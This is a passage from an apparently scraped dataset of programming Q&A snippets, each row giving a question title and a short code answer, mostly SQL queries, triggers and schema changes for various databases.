.add(Restrictions.eq(""name"", ""Huck"")));
List<Kite> list = crit.list();
"
25083,65867,SQL - reducing duplication in SELECT and WHERE clause,"SELECT Address1
FROM (SELECT LTRIM(RTRIM(Address1)) AS Address1, Address2
      FROM Customers) AS sub
WHERE Address1 = Address2
"
21195,14599,Three column conditions in database," SELECT * FROM table 
 WHERE column1=value1
 and  column2=value2
 and  column3=value3;
"
25921,22585,Join two sql queries,"SELECT t1.Activity, t1.""Total Amount 2009"", t2.""Total Amount 2008""
FROM (query1) as t1, (query2) as t2
WHERE t1.Activity = t2.Activity
"
16143,7478,"Oracle -- WITH CLAUSE => MERGE? (Syntax error, )","MERGE INTO animalia d
USING (WITH X AS 
       (SELECT  'moo' AS COW, 'woof' AS CAT, 
                (SELECT MAX( DECIBELS ) 
                   FROM ANIMALIA 
                  WHERE COW = 'moo' ) AS DECIBELS
          FROM DUAL )
       SELECT * FROM X) q ON (1 = 1)
 WHEN MATCHED THEN UPDATE SET d.cow = q.cow||' and more';
"
15195,51048,Copy column content PostgreSQL 7.4,"update x set new_column_value = old_column_value
"
28269,70174,Breeze predicate: column = null vs column IS NULL,"var p2 = new Predicate(""Region"", FilterQueryOp.Equals, null);
"
36384,38572,Yesod Persistent - Using two names for a column,"MyEntity
    boo Text sql=foo
"
35689,3545,PowerBuilder application login,"n_cst_String lnv_String

ltr_NewConnect.DBMS = SQLCA.DBMS
ltr_NewConnect.AutoCommit = SQLCA.AutoCommit
ltr_NewConnect.DBParm = lnv_String.of_GlobalReplace (SQLCA.DBParm, ""mytestdb"", ""myotherdb"")
"
39866,45887,how to perform a simple join,"select p1.userid, p1.username, p2.userid, p2.username
from players p
join users p1 on p.player1 = p1.userid
join users p2 on p.player2 = p2.userid
where ...
"
970,57611,Limit results per column value,"select category, subcategory, `count`
from (
    select *, 
         ( 
            case category 
            when @curCategory 
            then @curRow := @curRow + 1 
            else @curRow := 1 AND @curCategory := category end
          ) + 1 AS rank
    from yourtable cross join (select @curRow:=0, @curCategory:='') c
    order by category, `count` desc
) t
where rank <= 100
"
36000,8834,What is the string concatenation operator in Oracle?,"select 'Mr ' || ename from emp;
"
24303,49055,TSQL ORDER-BY with a UNION of disparate datasets,"Select ID, Cat, Price, Name, Abbrv
From
(SELECT t1.ID, t1.Cat, t1.Price, t1.Price AS SortPrice, NULL as Name, NULL as Abbrv 
FROM t1
UNION
SELECT t2.ID, NULL as Cat, NULL as Price, t1.Price as SortPrice, t2.Name, t2.Abbrv 
   FROM t2
   inner join t1 on t2.id = t1.id
) t3
ORDER BY SortPrice DESC, Abbrv ASC
"
21311,66598,Relational database design considering partly dependent information?,"CREATE TABLE ImportantText (
    Text_Id integer NOT NULL ,
    Display_Color integer NOT NULL ,
    PRIMARY KEY (Text_Id),
    CONSTRAINT ImportantTextSubtypeOfText
        FOREIGN KEY (Text_Id) REFERENCES Text (Text_Id)
        ON DELETE CASCADE ON UPDATE CASCADE
);
"
24076,52226,SQL to return rows that which contain same data for one field but different data for others,"select TeacherName
from (
    select TeacherName, CourseN
    from Teacher
    group by TeacherName, CourseN
    ) t1
group by TeacherName
having count(*) >=2
"
31878,49347,Update data based on other column,"UPDATE TableName
SET JoinDate = CASE WHEN NextLevel = 'Hour' THEN DATEADD(HH,1,ISNULL(ModifiedDate,CreatedDate))
                    WHEN NextLevel = 'Day' THEN DATEADD(DD,1,ISNULL(ModifiedDate,CreatedDate))
                    WHEN NextLevel = 'Min' THEN DATEADD(MI,1,ISNULL(ModifiedDate,CreatedDate))
                END
"
16679,62919,How do you do many to many table outer joins?,"SELECT * FROM foo
  LEFT OUTER JOIN (foo2bar JOIN bar ON (foo2bar.bid = bar.bid AND zid = 30))
  USING (fid);
"
6869,3347,Follow up on earlier today: Is there any way I can speed up the following insert(s)?,"DECLARE
  TYPE arrayType IS VARRAY(5) OF VARCHAR2(5);
  v_my_array arrayType := arrayType('foo', 'bar', 'baz', 'qux', 'quux');
  max NUMBER := 1000000;
  TYPE t_data IS TABLE OF myTable%ROWTYPE INDEX BY PLS_INTEGER;
  v_data t_data;
  v_row  myTable%ROWTYPE;
BEGIN
  FOR i IN 1..10
  LOOP
     FOR j IN 1..100000
     LOOP
       v_row.random_value1 := DBMS_RANDOM.VALUE(1, 500);
       v_row.random_value2 := DBMS_RANDOM.VALUE(1, 500);
       v_row.random_string := v_my_array(DBMS_RANDOM.VALUE(1, 5));
       v_data(j) := v_row;
     END LOOP;
     FORALL k IN INDICIES OF v_data
       INSERT INTO myTable VALUES v_Data(k);
  END LOOP;
END;
/
"
31634,71128,T-Sql: Select Rows where at least two fields matches condition,"SELECT *
FROM mytable
CROSS APPLY (
  SELECT COUNT(*) AS cnt
  FROM (VALUES (val1), (val2), (val3), (val4), (val5)) AS t(v)
  WHERE t.v = 4) AS x
WHERE x.cnt >= 2  
"
33181,72438,Using data from other columns (UPDATE in MySQL),"UPDATE salesrule
SET name = CONCAT('Code for customer:', description)
WHERE name LIKE '1000%'
"
27822,49798,SQL SUM function doubling the amount it should using multiple tables,"SELECT a.[activityID], 
    a.[activityName], 
    a.[activityDate], 
    a.[activityPlaces], 
    a.[activityPrice], 
    coalesce(b.bookingTotal, 0) bookingTotal, 
    coalesce(t.tempPlacesReserved, 0) tempPlacesReserved
FROM [LeisureActivities].[dbo].[activities] a
LEFT JOIN
(
  select activityID,
    SUM([bookingPlaces]) AS bookingTotal
  from [LeisureActivities].[dbo].[bookings]
  group by activityID
) b
  ON a.[activityID]=b.[activityID] 
LEFT JOIN
(
  select tempActivityID,
    SUM(CASE WHEN [tempReserveDate] > GetDate() THEN [tempPlaces] ELSE 0 end) AS tempPlacesReserved
  from [LeisureActivities].[dbo].[tempbookings]
  group by tempActivityID
) t
  ON a.[activityID]=t.[tempActivityID]
WHERE a.[activityDate] > GetDate();
"
6809,25140,Oracle Statement to sum a calculated column by another column,"SELECT COMPANIES.COMPANY_NAME, 
        SUM(INVC_DETAIL.QTY_SHIP * INVC_DETAIL.UNIT_PRICE) as SumExt_Price
FROM   (INVC_DETAIL INVC_DETAIL INNER JOIN INVC_HEADER INVC_HEADER ON INVC_DETAIL.INH_AUTO_KEY=INVC_HEADER.INH_AUTO_KEY) 
        INNER JOIN COMPANIES COMPANIES ON INVC_HEADER.CMP_AUTO_KEY=COMPANIES.CMP_AUTO_KEY
GROUP BY COMPANIES.COMPANY_NAME
"
14828,4836,MySQL Query show results based on multiple filters/tags,"SELECT p.* 
From `Photos` AS p
WHERE p.`Description` LIKE ""%test%"" AND 
  AND Exists
      ( Select 1 FROM `PhotosTagsXref` AS pt
        Inner JOIN `PhotosTags` AS t ON pt.`TagId` = t.`ID`
        Where pt.`PhotoId` = p.`ID`
          And t.Category = 'FirstCatToSearch'
      )   
  AND Exists
      ( Select 1 FROM `PhotosTagsXref` AS pt
        Inner JOIN `PhotosTags` AS t ON pt.`TagId` = t.`ID`
        Where pt.`PhotoId` = p.`ID`
          And t.Category = 'SecondCatToSearch'
      )   
  AND Exists
      ( ...
      )   
      ...
"
17139,17976,Query running longer by adding unused WHERE conditions,"IF (@AuthorType = 1)
  SELECT ... FROM ... WHERE ...
ELSE IF (@AuthorType = 2)
  SELECT ... FROM ... WHERE ...
ELSE ...
"
13599,37112,Get a subset of rows grouping by one of them,"select options, product_id, max(id) as id
from (
      <The query that returns the rows on this question>
     ) prodvalues
group by product_id, options;
"
8804,344,Group By data from a text column,"select substring(notes, 13, 4) filledby -- should be -G J- if I counted right
, count(*) records
from invoice
where notes like '% ' + @date + '%'
group by substring(notes, 13, 4)
"
34399,18790,Select the specific row from the DB having the date of tomorrow and day after tomorrow date from the present date,"...
WHERE
   cast(AptTime as date) 
   BETWEEN dateadd(day, 1, cast(getdate() as date)) 
       AND dateadd(day, 2, cast(getdate() as date))
"
36262,16772,Group rows with similar strings,"SELECT CASE 
         WHEN anm_category LIKE '%dog' THEN 'Dogs' 
         WHEN anm_category LIKE '%cat' THEN 'cats' 
         ELSE 'Others' 
       END            AS Animals_category, 
       Sum(anm_sales) AS total_sales 
FROM   yourtables 
GROUP  BY CASE 
            WHEN anm_category LIKE '%dog' THEN 'Dogs' 
            WHEN anm_category LIKE '%cat' THEN 'cats' 
            ELSE 'Others' 
          END 
"
9362,70875,Finding maximum values in a table,"select *
from orders
where EmployeeID  = (select max(EmployeeID) from orders);
"
39271,75092,How to update table based on the value of other table in sql server,"UPDATE table2 
SET total = (
         SELECT value2 
         FROM table1 WHERE name = value1
        ) 
WHERE table2.type = Name2
"
5273,57774,SQL - Conditional WHERE clause,"SELECT *
FROM
    Customer c
WHERE
    c.StateID=@StateID
    AND ( c.CountyID=@CountyID OR @CountyID IS NULL )
    AND ( c.CityID=@CityID OR @CityID IS NULL )
"
22692,32127,SQL Sum and Count,"SELECT [Date Recorded], VoteID, COUNT(*) [Count]
FROM YourTable
GROUP BY [Date Recorded], VoteID
"
2658,15291,SQL query for displaying related values on same column as separate columns,"SELECT
  mt1.Text AS Issues,
  mt2.Text AS Comment
FROM MyTable mt1
JOIN Mytable mt2
  ON mt1.ID = mt2.ID
  AND mt1.LANID = 101
  AND mt2.LANID = 102
"
4587,59266,switch DataContext according to departmentID,"if (_login.departmentID==""Orange"")
{
  OrderDBDataContext OrderDBDC = new OrderDBDataContext(""ConnectionString 1"");
}

if (_login.departmentID==""Tristar"")
{
  OrderDBDataContext OrderDBDC = new OrderDBDataContext(""ConnectionString 2c"");
}
"
29011,41722,How to show the results for the last three months?," select 
          d.DivisionName,
          SUM( case when PreQuery.ByMonth = DATENAME(Month, DateAdd( month, -2, GetDate())
                    then PreQuery.DistinctQuizes else 0 end ) as TwoMonthsAgoCount,
          SUM( case when PreQuery.ByMonth = DATENAME(Month, DateAdd( month, -1, GetDate())
                    then PreQuery.DistinctQuizes else 0 end ) as OneMonthAgoCount,
          SUM( case when PreQuery.ByMonth = DATENAME(Month, GetDate())
                    then PreQuery.DistinctQuizes else 0 end ) as CurrentMonthCount
       from
          Divisions d
             left join
             ( select count( distinct UQ.QuizID ) DistinctQuizes,
                     DATENAME(Month, UQ.DateTimeComplete) ByMonth,
                      d2.DivisionName
                  from 
                     UserQuiz UQ
                        JOIN Quiz Q on UQ.QuizID = Q.QuizID
                        JOIN Employee E on UQ.UserName = E.UserName
                           JOIN Divisions D2 on E.DivisionCode = D2.SapCode
                  where
                    UQ.DateTimeComplete between 
                        DateAdd( month, -2, GetDate())  and GetDate() 
                  group by 
                     d2.DivisionName,
                     DATENAME(Month, UQ.DateTimeComplete)
             ) PreQuery
             ON d.DivisionName = PreQuery.DivisionName
   GROUP BY
      d.DivisionName
"
28440,57275,SQL Unique Distinct Column 1 and not the other columns,"select FinalID, min(finaltime), max(finaltime),
       min(finalos), max(finalos)
from dbo.FinalList join
     dbo.Users
     on dbo.FinalList.FinalID = dbo.Users.usersid 
where FinalDate >='2014-07-01' and
      finaldate <='2014-07-01' and
      finaltime >='00:00:00' and
      FinalTime <= '00:59:59'
group by FinalId;
"
1775,71275,How to Select the rows where i found one times the customer id,"Select ID, date_commande, ID_customer
from table
where ID_Customer in
(Select ID_Customer from table Group by ID_Customer having count(*) = 1)
"
9558,4690,Update date format in mysql,"UPDATE tableName
SET    coldate = DATE_FORMAT(STR_TO_DATE(colDate,'%m/%d/%y'),'%Y/%m/%d')
"
39134,61193,SQL select row where SUM of a column is greatest (with two fields in GROUP BY),"SELECT projectID,
       businessID,
       summ
  FROM(SELECT projectID,
              businessID,
              SUM(number) AS summ,
              ROW_NUMBER() OVER (PARTITION BY projectID
                                     ORDER BY SUM(number) DESC) AS rn
        FROM table
       GROUP
          BY projectID,
             businessID
      ) t
 WHERE rn = 1
 ORDER
    BY projectID;
"
39425,74520,SQL : Conditional result used in the same conditional outputs,"SELECT column10, COALESCE(
   (SELECT columnName10 
   FROM OtherExampleTable WHERE id=15), 'nothing') 
FROM ExampleTable;
"
5753,39693,Selecting sets of data and creating a new column in SQL Server,"update T
    set fiscal_year = YearNumbers.FiscalYear
from T
    inner join
    (
        select WeekEndingDate, WeekNumber, DENSE_RANK() over (partition by WeekNumber order by WeekEndingDate) as FiscalYear
        from T
    ) as YearNumbers
    on T.WeekEndingDate = YearNumbers.WeekEndingDate and T.WeekNumber = YearNumbers.WeekNumber
"
33370,27249,MySQL - returning data from one table which match multiple combinations of data in another table,"Select b.book_name from books b, meta_data m, meta_data md
WHERE b.id = m.fk_id and b.id = md.fk_id 
and m.label ='pages' and m.data = 10 
and md.label ='pub' and md.data='smith' 
"
27278,1253,Insert military time into a datetime column,"CAST(DATEADD(MINUTE, 60 * FLOOR(StartTime/100) + StartTime % 100, CONVERT(char(12), ROW_DATE, 112)) AS DATETIME) AS DATE_TOME
"
11029,61957,Split a column into multiple columns by a delimiter (that may or may not be there),"select
id,
case when instr(address,',') >= 1
   then REGEXP_SUBSTR(address, '[^,]+', 1, 1) 
   else null end num,
case when instr(address,',') >= 1
   then REGEXP_SUBSTR(address, '[^,]+', 1, 2) 
   else address end street,
case when instr(address,',') >= 1
   then REGEXP_SUBSTR(address, '[^,]+', 1, 3) 
   else null end city
from ads
"
36146,34956,Find duplicates for several columns exclusive ID-column,"select *
from @T as T1
where exists (select *
              from @T as T2
              where
                T1.ID <> T2.ID and
                T1.C1 = T2.C1 and
                T1.C2 = T2.C2 and
                T1.C3 = T2.C3)
"
8902,36811,How to pull summary data even when there is no rows returned?,"Select 
MODE,  
SUM(POLCT) AS POLCT,
SUM(RDRCNT ) AS RDRCNT,  
SUM(INCCNT) AS INCCNT,  
SUM(INCINS ) AS INCINS,
SUM(INS_AMOUNT) AS INS_AMOUNT,
SUM (PREM) AS PREM  FROM 
(SELECT CASE             
when mode = '12' then 'D Annual'  
when mode = '03' then 'B Quarterly'  
when mode = '06' then 'C SemiAnnual'    
when mode = '01' then 'A Monthly'      
else ' ' end as MODE,      
POLICY_COUNT * NEGATIVE AS POLCT,    
RIDER_COUNT * NEGATIVE AS RDRCNT, 
Incnt * NEGATIVE AS INCCNT, 
INS_AMOUNT * NEGATIVE * Incnt AS INCINS, 
INS_AMOUNT * NEGATIVE AS INS_AMOUNT, 
PRSC * NEGATIVE AS PREM   
FROM    Dist_Of_Issues as a 
Left Outer Join Dist_Of_Issues_Plans as b on a.PlanID = b.PlanID  
Left Outer Join Dist_Of_Issues_Type_Order as c on b.Type = c.Type 
where substring(a.PlanID,1,4) not in ('1020','2599','1600','1601','2597','2598') and
(a.Month < 4 and a.Month > 0) and a.Year = 2014 
UNION ALL
Select distinct (CASE             
when mode = '12' then 'D Annual'  
when mode = '03' then 'B Quarterly'  
when mode = '06' then 'C SemiAnnual'    
when mode = '01' then 'A Monthly'      
else ' '         end) as MODE, 0 as POLCT, 0 as RDRCNT, 0 as INCCNT, 0 as INCINS, 0 as 
INS_AMOUNT, 0 as PREM from Dist_Of_Issues) as A   
Group BY Mode    ORDER BY Mode'
"
14290,4005,Need help with generic update trigger,"SELECT 
    'CREATE TRIGGER [tr_u_'+TABLE_SCHEMA+'_'+TABLE_NAME+'] ON ['+TABLE_SCHEMA+'].['+TABLE_NAME+']'
        +'AFTER UPDATE AS '
        +'UPDATE ['+TABLE_SCHEMA+'].['+TABLE_NAME+'] '
        +'    SET Last_Updated=GETDATE() '
        +'    FROM ['+TABLE_SCHEMA+'].['+TABLE_NAME+']  A '
        +'    INNER JOIN INSERTED  i ON a.pk=i.pk '
    FROM INFORMATION_SCHEMA.COLUMNS 
    WHERE COLUMN_NAME='LastChgDate' --'Last_Updated'
"
21032,68500,MySQL: Use value from table 2 instead of table 1 when exists in table 2,"SELECT  planning.*,     
    planning_dagen.planning_id, 
    planning_dagen.dagen,
    planning_dagen.data_import,
    CASE
        WHEN routenummer_wijzigingen.routenummer is not NULL
            THEN routenummer_wijzigingen.routenummer
        ELSE planning.routenummer
    END AS temp_routenummer
FROM planning
...
LEFT JOIN routenummer_wijzigingen rw on 
    planning.planning_id=rw.planning_id and rw.datum=...
"
35897,32735,PostgreSQL - finding and updating multiple records,"with stats as (
    SELECT ""ID"", 
           ""rows"",
           row_number() over (partition by ""ID"" order by rows) as rn,
           count(*) over (partition by ""ID"") as cnt
    FROM Table1
)
UPDATE Table1
   SET ""ID"" = CASE WHEN s.cnt > 1 THEN s.""ID"" || '-' || s.rn 
                   ELSE s.""ID""
              END
  FROM stats s
 WHERE S.""ID"" = Table1.""ID""
   AND S.""rows"" = Table1.""rows""
"
11991,21990,Is there any way to optimize this MYSQL query,"SELECT
    * 
FROM
    table_products P
INNER JOIN
    table_product_categories PC 
ON
    PC.product_id = P.product_id
INNER JOIN
    table_product_varients PV
ON
    P.product_id = PV.product_id
INNER JOIN
    table_varients V
ON
    V.varient_id = PV.varient_id
where 
    table_product_categories.category_id = '$cate_id' 
"
37791,53967,MYSQL INNER JOIN where attribute does not exist for one row,"select c.config, n.name, coalesce(p.passed_count, 0) as passed_count
from config c cross join
     (select distinct name from projects p) n left join
     projects p
     on p.name = n.name and p.config = c.config;
"
32830,34309,SQL percentage aggregation over group by clause,"select q2.server, q2.ip_address, concat(round((q2.c / q1.c) * 100, 2), '%(', q2.c, '/', q1.c, ')') as percent 
  from
    (
      select server, count(*) c 
        from ServerNames 
        where server is not null 
          and server != '' 
          and timestamp >= '2015-03-18'
          and timestamp <= '2015-04-19' 
        group by server
     ) q1
     inner join
     (
       select server, ip_address, count(*) c  
         from serverNames 
         where server is not null 
           and server != '' 
           and ip_address is not null 
           and ip_address != '' 
           and timestamp >= '2015-03-18'
           and timestamp <= '2015-04-19'  
         group by server, ip_address
     ) q2
     on q1.server = q2.server
"
6395,53471,Select two table and order by date,"SELECT
  p.id,
  MAX(GREATEST(dtd.date_modified, dbt.date_modified)) AS MaxDate
FROM projects p
LEFT JOIN doc_to_do dtd ON p.id = dtd.projects_id
LEFT JOIN doc_bug_tracker dbt ON p.id = dbt.projects_id
WHERE p.id = <project_id>
GROUP BY p.id
"
9671,24678,Update data in table1 where duplicates in table2,";WITH cteDedup AS(
  SELECT
    UserId
   ,FName
   ,LName
   ,ROW_NUMBER() OVER(PARTITION BY FName, LName ORDER BY UserID ASC) AS row_num
  FROM UserTable
 )

 UPDATE rt
 SET UserId = original.UserId
 FROM ResultsTable rt
 JOIN cteDedup dupe
   ON rt.UserId = dupe.UserId
 JOIN cteDedup original
   ON dupe.FName = original.FName
   AND dupe.LName = original.LName
 WHERE dupe.row_num <> 1
   AND original.row_num = 1
"
24614,57434,Matching a group that may or may not exist,"(.*?)\s(\d{5})\s(.+?)\s?(FINLAND|SUOMI)?$
"
24042,40485,PostgreSQL query returning multiple rows based on id,"select *
from table
where id in (1, 2, 3)
"
13048,517,Automatically create record when another is created,"CREATE TRIGGER TRI_USERS_INSERT on Users
AFTER INSERT
AS
SET NOCOUNT ON

-- If you have a Default RoleID, select that into a variable and use it in the INSERT below.
-- For this example, I am using just the number 1
-- Also assumes that the ID for Memberships table is AUTO GENERATED, so it's not in INSERT list.
INSERT INTO Memberships (UserID, RoleID)
    SELECT ID, 1 FROM INSERTED
GO
"
569,60856,"How can I write just one query whose only difference is in the where clause, to capture logic of a boolean test?","  select 
   id, flavor, color
from 
   menu
   where 
        (flag = 'Y' and flavor in (1,2,3,4,5))
        or(nvl(flag,'N') = 'N' and flavor in (2,4,6)) ;
"
8563,22325,"ORDER BY ""ENUM field"" in MYSQL","ORDER BY CAST(noticeBy AS CHAR)
"
25178,23939,MySQL: Get results only if there is specific user id or user id is null,"SELECT c.competition_id, c1.name AS first, c2.name AS second, c.date, r.result_id, r.user_id 
FROM competitions c
JOIN countries c1 ON c.first=c1.country_id
JOIN countries c2 ON c.second=c2.country_id
LEFT JOIN results r ON c.competition_id=r.competition_id and r.user_id = 1
WHERE c.date='2013-07-04'
"
26100,72868,Making an SQL prodedure to add characters to a string,"DECLARE @t NVARCHAR(10) = N'0446793932'
SELECT @t, REPLICATE(N'0', 18 - LEN(@t)) + @t 
"
7873,38713,Oracle equivalent of PostgreSQL's sub-select to array?,"select c.name, cursor(select order_id from ORDER o where o.customer_id = c.id)
from CUSTOMER c;
"
5140,23936,SQL connect two columns,"SELECT *
FROM table1
WHERE CONCAT(column1, column2) = '0123456789';
"
38273,48313,how to reverse engineer sqlplus login from jdbc connection parameters?,"sqlplus username/secret@//a-b.c.d.e:5001/f
"
24920,73337,Table row referencing one table or another,"CONSTRAINT a_eor_b CHECK 
  (
    NOT (a_id IS NULL AND b_id IS NULL)
    AND NOT (a_id IS NOT NULL AND b_id IS NOT NULL)
  )
"
27294,63613,I can't update multiple records in SQL,"CREATE TRIGGER trg_tbl1_closeAction
ON tbl1
AFTER UPDATE
AS
  BEGIN
    SET NOCOUNT ON
    INSERT INTO tbl2
        (tbl_1_ID, col4, usr)
        select i.ID, '10', tu.id
        from inserted i
        LEFT OUTER JOIN tbl3 tu ON tu.usr=i.LastModifiedBy
        WHERE i.col1 LIKE '%Close%';  
    END
"
22013,11807,Getting the next bill date using TSQL,"select o.*
from orders o
where datediff(day, StartedAt, getutcdate()) % @period = 0;
"
34664,13261,How can i nest these SQL statements without a group by clause error?,"SELECT a.*, a.[count] - Coalesce(b.[count], 0) as 'countDif' 
FROM 
    (
        SELECT [User Email Address],  COUNT(*) AS 'count'
        FROM [DATABASE].[TABLE]
        GROUP BY [User Email Address]
    ) AS a
    LEFT JOIN (
        SELECT [User Email Address],  COUNT(*) AS 'count'
        FROM [DATABASE].[TABLE]
        WHERE [Transaction Date] >= '2011-08-07 00:00:00.000'
        GROUP BY [User Email Address]
    ) AS b ON a.[User Email Address] = b.[User Email Address]
"
9006,14322,What is the best scenario in this case?,"employees:
    id
    name
    group (foreign key to groups.id; can be null)

trainings:
    id
    trainingName

groups:
    id
    groupName

groups_trainings
    id
    trainingID (foreign key to trainings.id)
    groupID (foreign key to groups.id)
"
28693,58924,SQL joining a few count(*) group by selections,"SELECT n, COUNT(*) as freq FROM 
(
  SELECT n1 AS n FROM lottery
  UNION ALL
  SELECT n2 FROM lottery
  UNION ALL
  SELECT n3 FROM lottery
  UNION ALL
  SELECT n4 FROM lottery
  UNION ALL
  SELECT n5 FROM lottery
  UNION ALL
  SELECT n6 FROM lottery
) as transposed
GROUP BY n
ORDER BY COUNT(*) DESC
"
37176,58762,DB2 Select from two tables when one table requires sum,"select s.ProductId, s.SupplyStock, sum(d.DemandStock),
       (s.SupplyStock - sum(d.DemandStock)) as Available
from Supply s left join
     Demand d
     on s.ProductId = d.ProductId 
where s.ProductId = 109
group by s.ProductId, s.SupplyStock;
"
16533,24006,"PostgreSQL, How to re-cast a table column from Integer to Decimal?","ALTER TABLE my_table_name ALTER some_column TYPE decimal;
"
5484,39116,Oracle-Complex sql view creation,"select id, value, step,
       coalesce(max(qa_next) over (partition by id, value), 'NA') as ""Output""
from (select t.*,
             max(case when step = 'QA' then nextstep end) over (partition by id, value) as qa_next
      from (select t.*,
                   lead(step) over (partition by id, value order by StepOrder) as nextStep
            from table t
           ) t
     ) t
"
13990,11257,How do I output this list of numbers via SQL?,"CREATE TABLE [dbo].[numberstable](
    [n1] [int] NULL,
    [n2] [int] NULL,
    [n3] [int] NULL,
    [n4] [int] NULL,
    [n5] [int] NULL
) ON [PRIMARY]
go
insert into numberstable values (1,2,3,4,5)
go
WITH range
AS (
SELECT N1 AS c FROM numberstable
      UNION  
      SELECT N2 FROM numberstable
      UNION  
      SELECT N3 FROM numberstable
      UNION  
      SELECT N4 FROM numberstable
      UNION  
      SELECT N5 FROM numberstable)
SELECT *
FROM range r1,range r2,range r3,range r4,range r5
    where r1.c <> r2.c and r1.c<>r3.c and r1.c<>r4.c and r1.c<>r5.c
    and r2.c <> r3.c and r2.c<>r4.c and r2.c<>r5.c
    and r3.c<>r4.c and r3.c<>r5.c
    and r4.c <> r5.c
order by r1.c, r2.c, r3.c, r4.c, r5.c
go
drop table numberstable
go
"
39792,30692,how to show decimals in sql instead of 0,"SELECT FORMAT(this / that, 2) as rate
"
35758,18128,mysql search where 3 columns for row have the same value,"SELECT id
  FROM your_table
WHERE id = in_id
  AND nat_id = in_id
;
"
9472,45391,SQL query challenge,"SELECT machineid, MIN(start_time), MAX(end_time)
  FROM (SELECT machineid, start_time, end_time, 
               SUM(gap) over(PARTITION BY machineid 
                             ORDER BY start_time) contiguous_faults
           FROM (SELECT machineid, start_time, 
                        coalesce(end_time, DATE '9999-12-31') end_time,
                         CASE
                            WHEN start_time > MAX(coalesce(end_time, 
                                                           DATE '9999-12-31'))
                                              over(PARTITION BY machineid 
                                                   ORDER BY start_time 
                                                   ROWS BETWEEN UNBOUNDED PRECEDING
                                                            AND 1 preceding)
                            THEN 1
                         END gap
                    FROM faults))
 GROUP BY machineid, contiguous_faults
 ORDER BY 1, 2
"
4345,3173,SQL - Add Column With Count(),"select
    lag(possession,1) over (order by id) as last_possession,
    possession,
    clock,
    count(*) over (partition by possession) cnt
from plays
where
    game_id in (583615)
    and league = 3
    and period in (0,1)
"
13854,69014,Using an equality check between columns in a SELECT clause,"case when FirstEvent.TitleID = SecondEvent.TitleID then 1 else 0 end as titlesSameCheck 
"
18982,23972,"How to display the first row, depending on a value","select *
  from (
select *, rn=row_number() over (partition by [product#] order by [datetime] desc)
  from tests
     ) x
 where rn=1 and result = 'pass';
"
30118,12986,Nonexisting Oracle Database Constraint Violated,"select * from all_ind_columns where index_name = 'MY_TABLE_TWO_UK01';
"
7856,29580,SQL Server CONFIG statement cannot be used inside a user transaction,"CREATE PROCEDURE dbo.my_config
AS
    EXEC sp_configure 'show advanced option', 1;
    RECONFIGURE WITH OVERRIDE;
    EXEC sp_configure 'xp_cmdshell', 1;
    EXEC sp_configure 'ad hoc distributed queries', 1;
    RECONFIGURE WITH OVERRIDE;
GO
CREATE PROCEDURE dbo.nz_test1
AS
    SELECT 1 AS Value;
GO
CREATE PROCEDURE dbo.test_nz_tb3
AS
    EXEC dbo.my_config;
    CREATE TABLE #t (a varchar(10));
    INSERT INTO #t
        EXEC dbo.nz_test1;
"
7862,34966,SQL Server 2005- Add area code to records shorter than 10 characters,"DECLARE @AreaCode char(3)
SET @AreaCode = 'XXX'

UPDATE myTable
SET myField = @AreaCode + myField
WHERE LEN(myField) < 10
AND myField NOT LIKE @AreaCode + '%'
"
9622,32267,Join two spreadsheets on a common column in Excel or OpenOffice,"=vlookup(
    a2, # the cell value from the current table to look up in the other table
    table_a!$1:$174832718, # the other table
                           # don't manually type this--select the entire 
                           # other table while the cursor is editing this
                           # cell, then add the ""$""s--Excel doesn't
                           # automatically add them
                           # (the syntax here is for different sheets in
                           # the same file, but Excel will fill this in 
                           # correctly for different files as well)
    2, # the column to get from the other table (A=1, B=2, etc.)
    FALSE) # FALSE=only get exact matches TRUE=find approx. matches if no exact match
"
36265,12275,SQL Server 2008 - How to Join 3 tables,"SELECT Users.Name, Scores.LessonID, Scores.Result, Lessons.Title
FROM Users
INNER JOIN Scores ON Users.StudentID = Scores.StudentID
INNER JOIN Lessons On Scores.LessonID = Lessons.LessonID
"
36580,47364,"RESTORE to new DB with same login, access, and role permissions","USE [Database Name]
GO
EXEC sp_addrolemember 'Database role', 'Username'
"
16698,60938,SQL Server Parent/Child CTE Ordering issue,"SELECT NoteID, ParentNoteID, NoteText
FROM dms_Notes
WHERE DocketID = 43477 -- this filter is just to make the resultset smaller
ORDER BY IIF(ParentNoteID <> 0, ParentNoteID, NoteID), NoteText
"
27118,38047,"Advanced Ordering Or Grouping Of Query Results (having?), Access 2013","SELECT listOfAllFaculty.[ID], listOfAllFaculty.[lastName], ...
FROM listOfAllFaculty
WHERE (((listOfAllFaculty.department1)=[Type Department1])) Or    
    (((listOfAllFaculty.department2)=[Type Department2])) Or 
    (((listOfAllFaculty.affiliation1)=[Type Affiliation1])) Or
     (((listOfAllFaculty.affiliation2)=[Type Affiliation2])) Or
     (((listOfAllFaculty.affiliation3)=[Type Affiliation3])) Or
     (((listOfAllFaculty.affiliation4)=[Type Affiliation4])) Or
     (((listOfAllFaculty.affiliation5)=[Type Affiliation5]))
ORDER BY 
    IIF(listOfAllFaculty.department1=[Type Department1],0,
        IIF(listOfAllFaculty.department2=[Type Department2],0,1))
"
11768,69880,Duplicate Records in a SQL Join,"Select s.[BidderNumber] as 'Bid #',
    ltrim(rtrim(b.bidderName)) as 'Name',
    isnull(sum(s.saleprice * Quantity),0) as 'Spent', 
    (select isnull(sum(t.Amount),0) from transactions t
          where t.SalesCounter = s.SaleCounter) as 'Paid', b.cconfile, t.Notes --, s.biddernumber 
Into #Temp1
from sales s inner join Bidders b on s.BidderNumber = b.BidderNumber
group by s.BidderNumber, b.bidderName, b.CCOnFile
order by s.Biddernumber, b.biddername, b.cconfile
"
13601,68075,Pivot table and get aggregation on multiple arguments,"select P.Region,
       P.Item,
       isnull(P.[1998], 0) as [1998],
       isnull(P.[1999], 0) as [1999],
       isnull(P.[2000], 0) as [2000]
from YourTable
unpivot (ItemsSold for Item in (carsSold, bicyclesSold)) as U
pivot (sum(ItemsSold) for year in ([1998], [1999], [2000])) as P
order by P.Region, P.Item
"
11289,63095,sql If statement or case,"DECLARE @Stages TABLE (
      Name varchar(20), 
      Stage int, 
      StageDate datetime);

INSERT INTO @Stages (Name, Stage, StageDate)
VALUES
    ('Player 1', 1, '2015-04-01'),
    ('Player 1', 2, '2015-05-01'),
    ('Player 1', 3, '2015-06-01'),
    ('Player 2', 1, '2015-04-01'),
    ('Player 2', 2, '2015-05-01');

SELECT NAME, Stage, 
        CASE WHEN Stage >=1 THEN (SELECT s2.StageDate FROM @Stages s2 Where s2.Name = s1.Name and s2.Stage =1)  Else NULL END As Stage1Date,
        CASE WHEN Stage >=2 THEN (SELECT s2.StageDate FROM @Stages s2 Where s2.Name = s1.Name and s2.Stage =2)  Else NULL END As Stage2Date,
